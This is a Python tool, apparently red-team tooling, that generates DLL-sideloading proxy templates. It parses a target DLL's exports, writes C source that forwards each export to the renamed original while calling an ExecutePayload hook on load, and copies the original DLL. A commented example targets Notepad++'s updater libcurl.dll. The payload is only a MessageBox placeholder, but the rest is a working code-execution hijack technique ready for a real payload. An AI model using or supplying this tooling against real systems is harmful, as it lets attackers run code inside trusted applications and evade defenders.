"""
Nihilego - A DLL-Sideloading Template Creator
"""
import optparse
import os
import shutil
import sys

import pefile

source_def_file = """LIBRARY
EXPORTS

    SideloadedFunctionName @Ordinal"""

dllmain = """// dllmain.c : Defines the entry point for the DLL application.
#include "windows.h"

tester_functions_placeholder

void ExecutePayload()
{
    //Here you can add a global flag to make sure that it doesn't run again
    MessageBoxW(0, L"Payload Executed!", L"dll sideloading example", MB_OK);
}

/* sideloaded function example */

typedef PVOID(WINAPI* fnOriginalFuncName)(/*Add Parameters If Needed From Documentation*/);
    
extern __declspec(dllexport) PVOID OriginalFuncName() {
    ExecutePayload();

    HMODULE                  module_handle             = NULL;
    fnOriginalFuncName        pOriginalFuncName     = NULL;

    // Running the original function 
    if (!(module_handle = LoadLibraryW(L"dlloriginalname")))
        return NULL;

    if (!(pOriginalFuncName = (fnOriginalFuncName)GetProcAddress(module_handle, "OriginalFuncName")))
        return NULL;

    return pOriginalFuncName(/*Add Parameters If Needed*/);
}   



BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    /* uncomment for atexit functionality
    HMODULE msvcrtHandle;
    FARPROC msvcrtAtexitAddress;
    typedef int(__cdecl* msvcrtAtexitType)(void(__cdecl*)(void));
    msvcrtAtexitType msvcrtAtexit;
    */
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:

        MessageBoxW(0,L"Hello from Process Attached DLL!", L"dll sideloading example", MB_OK );

        /* uncomment for atexit functionality
        msvcrtHandle = GetModuleHandleW(L"msvcrt");
        if (msvcrtHandle == NULL)
            return TRUE;
        msvcrtAtexitAddress = GetProcAddress(msvcrtHandle, "atexit");
        msvcrtAtexit = (msvcrtAtexitType)(msvcrtAtexitAddress);
        msvcrtAtexit(ExecutePayload);
        */
        break;
    case DLL_THREAD_ATTACH:
        /*
        MessageBoxW(0, L"Hello from Thread Attached DLL!", L"dll sideloading example", MB_OK);
        */
        break;
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

"""


def exported_functions_test(target_dll, proxy_to_dll) -> list[str]:
    target_dll = target_dll.replace("\\", "/") if "\\" in target_dll else target_dll

    pe = pefile.PE(target_dll)
    dll = target_dll.replace("/", "\\\\").split(".dll")[0]
    d = [pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_EXPORT"]]
    pe.parse_data_directories(directories=d)
    exports = [(e.ordinal, e.name.decode()) for e in pe.DIRECTORY_ENTRY_EXPORT.symbols if e.name]
    test_functions_list = []

    for e in exports:
        test_functions_list.append('#pragma comment(linker,"/export:{func}={dll}.{func},@{ord}")'
                                   .format(func=e[1], dll=proxy_to_dll, ord=e[0]))

    return test_functions_list


def main() -> None:
    global dllmain

    parser = optparse.OptionParser(
        usage="Usage {} [-p | --proxy = DLL to proxy, -n | --name = new name for proxied dll]".format(
            sys.argv[0]), version="{} 1.0".format(sys.argv[0]))
    parser.add_option('-p', '--proxy=', dest='targetDLL', type='string', help='Specify the DLL for sideloading')
    parser.add_option('-n','--name=', dest='outputFilename', type='string', help='Specify the proxys new filename')

    (options, args) = parser.parse_args()
    if (options.outputFilename is None) or (options.targetDLL is None):
        print(parser.usage)
        exit(0)
    
    proxy_to_dll = options.outputFilename
    target_dll = options.targetDLL

    # proxy_to_dll = "ORIGINAL.dll"
    # target_dll = "C:\\Program Files (x86)\\Notepad++\\updater\\libcurl.dll"

    print(f"[+] Generating usage testers for target DLL {target_dll}")
    exported_functions_data = exported_functions_test(target_dll, proxy_to_dll)
    dllmain_data = '\n'.join(exported_functions_data)

    print("[+] Making the dllmain file")
    dllmain = dllmain.replace(r"tester_functions_placeholder", dllmain_data)
    dllmain = dllmain.replace(r"dlloriginalname", proxy_to_dll)

    if not os.path.exists('output'):
        os.makedirs('output')

    with open("./output/dllmain.c", "w") as file:
        file.write(dllmain)

    with open("./output/Source.def", "w") as file:
        file.write(source_def_file)

    shutil.copyfile(target_dll, "./output/placeholder".replace("placeholder", proxy_to_dll))


if __name__ == "__main__":
    main()
